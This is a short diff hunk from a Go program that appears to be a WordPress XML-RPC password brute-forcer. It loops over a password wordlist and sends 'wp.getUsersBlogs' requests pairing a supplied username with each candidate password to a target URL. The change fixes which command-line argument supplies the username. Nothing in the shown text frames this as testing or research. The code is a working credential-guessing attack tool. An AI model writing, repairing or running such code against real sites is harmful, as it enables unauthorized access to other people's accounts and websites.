@@ -28,7 +28,7 @@ func main() {
 	scanner := bufio.NewScanner(f)
 	var passwords string
 	for scanner.Scan() {
-		body := "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>" + os.Args[3] + "</value></param><param><value>" + scanner.Text() + "</value></param></params></methodCall>"
+		body := "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>" + os.Args[2] + "</value></param><param><value>" + scanner.Text() + "</value></param></params></methodCall>"
 		client := &http.Client{}
 		req, err := http.NewRequest("POST", os.Args[1], bytes.NewBuffer([]byte(body)))
 		if err != nil {
